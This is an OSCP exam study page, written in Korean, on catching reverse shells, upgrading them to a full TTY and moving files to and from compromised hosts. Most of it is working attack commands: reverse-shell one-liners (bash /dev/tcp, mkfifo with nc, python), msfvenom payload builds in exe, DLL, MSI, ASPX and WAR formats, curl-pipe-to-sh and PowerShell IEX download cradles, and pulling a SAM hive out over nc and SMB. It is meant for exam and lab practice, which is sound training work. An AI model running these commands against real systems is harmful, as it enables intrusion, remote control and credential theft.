---
title: 셸과 파일 전송
tags:
  - oscp
---

# 셸과 파일 전송 { #shells-file-transfer }

<div class="dfir-meta" markdown>
**적용 범위:** 모든 발판 · **우선순위:** 높음 · **최종 수정:** 2026-11-03
</div>

!!! abstract "한 문장 요약"
    "명령을 실행할 수 있다"를 스크린샷 찍을 수 있는 안정적인 대화형 셸로 바꾸고, 도구를 대상에 옮깁니다 — 페이로드는 직접 만들고(`msfvenom` 은 언제나 허용), Metasploit은 많아야 한 대에만.

## 1. 개념 { #concept }

순서대로 푸는 세 가지 문제입니다.

1. **콜백 받기** — 대상에서 Kali의 리스너로 리버스 셸(egress가 막혔으면 bind 셸).
2. **안정화** — Linux는 진짜 TTY, Windows는 히스토리/방향키. `Ctrl-C` 한 번에 셸을 잃지 않게.
3. **파일 옮기기** — 정보 수집 스크립트와 익스플로잇을 올리고, 루팅한 자료를 내려받기.

!!! danger "시험 규칙 — Metasploit은 한 대에만"
    - Metasploit 모듈(exploit / auxiliary / post) **또는** Meterpreter: 내가 고른 **한 대** 에만. 한 번 쓰면 그 선택은 고정 — 실패해도 바꿀 수 없음.
    - 여러 호스트에 `check` 를 돌려 고르는 것도 전부에 쓴 것으로 칩니다.
    - Metasploit 피벗(`autoroute`, `portfwd`, socks 모듈) 금지.
    - **모든 대상에 항상 허용:** `msfvenom`(모든 페이로드 형식)과 **Meterpreter가 아닌 페이로드** 의 `exploit/multi/handler`(예: `windows/x64/shell_reverse_tcp`).
    - 원문 → [시험 구조 › Metasploit](exam-format.md#metasploit).

## 2. 주요 도구 { #tools }

| 도구 | 용도 | 시험 허용 여부 |
|---|---|---|
| **nc / ncat + rlwrap** | 리스너, 간단한 전송 | 허용 |
| **msfvenom** | 리버스 셸 페이로드: exe, elf, dll, msi, aspx, war, php, raw 셸코드 | 어디서나 허용 |
| **multi/handler** | staged / Meterpreter가 아닌 페이로드 받기 | Meterpreter가 아닌 페이로드로 허용 |
| **python3 -m http.server** | Kali에서 파일 서빙 | 허용 |
| **impacket-smbserver** | Kali의 SMB 공유(복사, UNC에서 실행, 해시 캡처) | 허용 |
| **certutil / iwr / curl / wget** | 대상에서 다운로드([LOLBAS](https://lolbas-project.github.io/) / [GTFOBins](https://gtfobins.github.io/)) | 허용 |
| **evil-winrm** | WinRM 위 내장 `upload` / `download` | 허용 |

## 3. 시나리오 { #scenarios }

### 3.1 리스너와 원라이너 { #reverse-shells }

**상황:** 명령 실행(웹 셸, 명령 주입, 익스플로잇)이 되고 셸이 필요함.

```bash
# Kali — egress 규칙이 보통 허용하는 포트로 리스너
rlwrap -cAr nc -lvnp 443
```

=== "Linux 대상"

    ```bash
    bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'
    # bash /dev/tcp 가 없으면?
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI> 443 > /tmp/f
    busybox nc <KALI> 443 -e /bin/sh
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<KALI>",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
    ```

=== "Windows 대상"

    ```powershell
    # 먼저 nc.exe 업로드(3.5), 그다음:
    C:\Windows\Temp\nc.exe <KALI> 443 -e cmd.exe
    # 또는 msfvenom exe (3.2)
    C:\Windows\Temp\rev.exe
    ```

**볼 것:** `connect to [KALI] from (UNKNOWN) [IP]` → 들어왔음. 아무것도 안 오면? → 80 / 53 포트로, 대상이 나에게 닿기는 하는지 확인(`ping`, `curl http://<KALI>/`), 또는 bind 셸.

!!! tip "URL이나 JSON 안에 페이로드 넣기"
    따옴표 문제를 피하려면 base64로: `echo 'bash -i >& /dev/tcp/<KALI>/443 0>&1' | base64` → `echo <b64> | base64 -d | bash`. Windows는 `powershell -enc <UTF-16LE base64>`.

### 3.2 msfvenom — 필요한 페이로드 만들기 { #msfvenom }

**상황:** 익스플로잇에 셸코드가 필요하거나, 서비스 바이너리를 바꿔야 하거나, Tomcat manager가 WAR를 받거나, 업로드가 ASPX를 받음.

```bash
# Windows exe / 서비스 바이너리
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o rev.exe
# Windows DLL (DLL 하이재킹)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o evil.dll
# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
# ASPX (IIS 업로드)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f aspx -o rev.aspx
# WAR (Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o rev.war
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf -o rev.elf
# 공개 익스플로잇용 셸코드 (Python 형식, bad char 제거)
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode
```

**Stageless vs staged:** `shell_reverse_tcp`(밑줄)는 **stageless** → 그냥 `nc` 로 받음. `shell/reverse_tcp`(슬래시)는 **staged** → `multi/handler` 필요:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

**다음:** 아키텍처를 맞추세요(`x64` vs `x86` — `systeminfo` / `uname -m` 확인). 아키텍처가 틀리면 아무 말 없이 죽습니다.

### 3.3 Linux — 완전한 TTY로 업그레이드 { #tty-upgrade }

**상황:** 날것의 `nc` 셸: 탭 완성 없음, `sudo` / `su` 가 터미널 없다고 불평, `Ctrl-C` 에 죽음.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'    # 또는: script -qc /bin/bash /dev/null
# Ctrl-Z 누르기
stty raw -echo; fg
# Enter 누르고:
export TERM=xterm-256color SHELL=/bin/bash
stty rows 50 cols 200          # Kali의 `stty size` 와 맞추기
```

**볼 것:** 프롬프트가 제대로 다시 그려지고, `su` 가 비밀번호를 묻고, `vi` 가 동작함. **다음:** [Linux 권한 상승](privesc-linux.md).

!!! tip "SSH 크리덴셜이나 키가 있다면?"
    진짜 SSH를 쓰세요 — 가장 안정적인 셸이고, `ssh -L/-R/-D` 로 피벗도 공짜예요 → [피벗팅 › SSH](pivoting.md#ssh-forwarding). 찾은 키라면: `chmod 600 id_rsa; ssh -i id_rsa user@$IP`.

### 3.4 Windows — 쓸 만한 셸 { #windows-shell }

- 리스너는 항상 `rlwrap` 으로(히스토리 + 방향키).
- `cmd` 에서 `powershell -ep bypass` 로 PowerShell.
- 크리덴셜이 있고 5985가 열려 있으면 **evil-winrm** 이 최고의 셸 → [AD › evil-winrm](active-directory.md#evil-winrm).
- RDP 권한이 있으면: `xfreerdp3 /v:$IP /u:user /p:'Pass' /dynamic-resolution /drive:share,/home/kali/exam/tools`(구버전 Kali는 `xfreerdp`) — `/drive` 옵션이 Kali 폴더를 마운트해 파일 전송에 씁니다.

### 3.5 파일 전송 — Kali → 대상 { #upload }

```bash
# Kali: tools 폴더 서빙
cd ~/exam/tools && python3 -m http.server 80
```

=== "Linux 대상"

    ```bash
    wget http://<KALI>/linpeas.sh -O /tmp/lp.sh
    curl http://<KALI>/linpeas.sh -o /tmp/lp.sh
    curl http://<KALI>/linpeas.sh | sh                    # 디스크에 안 쓰고 실행
    # wget/curl 이 없으면:
    exec 3<>/dev/tcp/<KALI>/80; echo -e "GET /pspy64 HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/pspy   # (헤더는 나중에 잘라내기)
    ```

=== "Windows 대상"

    ```powershell
    iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
    certutil -urlcache -split -f http://<KALI>/nc.exe C:\Windows\Temp\nc.exe
    IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/PowerView.ps1')   # 메모리에서
    ```

**HTTP 대신 SMB** (445 egress만 허용될 때도 되고, 공유에서 바로 실행도 가능):

```bash
impacket-smbserver share ~/exam/tools -smb2support -username k -password k
```

```powershell
net use \\<KALI>\share /user:k k
copy \\<KALI>\share\mimikatz.exe C:\Windows\Temp\
\\<KALI>\share\winPEASx64.exe
```

쓸 수 있는 디렉터리에 쓰세요: `C:\Windows\Temp`, `C:\Users\Public`, `/tmp`, `/dev/shm`.

### 3.6 파일 전송 — 대상 → Kali (루팅 자료) { #download }

```bash
# Kali: nc 로 받기
nc -lvnp 9001 > loot/backup.zip
```

```bash
# Linux 대상
nc <KALI> 9001 < /var/backups/backup.zip
```

```powershell
# Windows 대상 → SMB 공유(위)
copy C:\Windows\Temp\sam.save \\<KALI>\share\
# evil-winrm 세션
download C:\Windows\Temp\sam.save
```

중요한 파일(KeePass, 레지스트리 하이브)은 양쪽에서 `md5sum` / `Get-FileHash` 로 무결성을 확인하세요.

!!! warning "시험 규칙 — 재미로 빼내지 않기"
    대상 장악에 필요한 파일만 내려받고, 끝나면 지우세요([그 밖의 규칙](exam-format.md#other-rules)).

## 4. 자주 하는 실수 { #mistakes }

- **아키텍처가 틀리거나 staged 페이로드를 `nc` 로 받기.** staged(`/`) 페이로드는 `multi/handler` 가 필요합니다.
- **"안정화하려고" Meterpreter 쓰기** — 한 대뿐인 Metasploit 기회를 써 버립니다.
- **egress가 막는 높은 포트에 리스너.** 443 / 80부터.
- **쓸 수 없는 디렉터리에 저장**(`C:\` 루트, `/root`) — 다운로드는 "됐는데" 아무것도 안 돌아감.
- **`impacket-smbserver` 에 `-smb2support` 빠뜨리기** — 최신 Windows는 SMB1을 거부합니다.
- **스크린샷 전에 셸을 잃기.** 대화형 셸을 얻으면 바로 플래그 스크린샷을 찍으세요.

## 5. 시험 팁 { #exam-tips }

- 시험 시작 전에 Windows(x64, x86)와 Linux 바이너리를 담은 `tools/` 폴더를 준비하고, 랩에서 하나씩 테스트해 두세요.
- 두 번째 예비 셸(리스너 하나 더, 또는 다시 실행되는 예약)이 권한 상승 도중 첫 셸이 죽을 때 살려 줍니다.
- 쓴 페이로드 명령을 전부 기록하세요 — `msfvenom` 줄은 리포트에 들어갑니다.

## 관련 페이지 { #related-pages }

- [시험 흐름](exam-workflow.md) · [웹과 초기 침투](web-initial-access.md) · [피벗팅](pivoting.md)
- [Linux 권한 상승](privesc-linux.md) · [Windows 권한 상승](privesc-windows.md)
- 방어자 관점: [PowerShell 크래들](../../adversary/powershell-cradles.md) · [LOLBins](../../adversary/lolbins.md) · [Beaconing / C2](../../network/beaconing-c2.md) · [Red Team: 실행 도구](../../redteam/post-exploitation/execution-tools.md)

## 참고 자료 { #references }

- [revshells.com](https://www.revshells.com/)
- [GTFOBins](https://gtfobins.github.io/) · [LOLBAS](https://lolbas-project.github.io/)
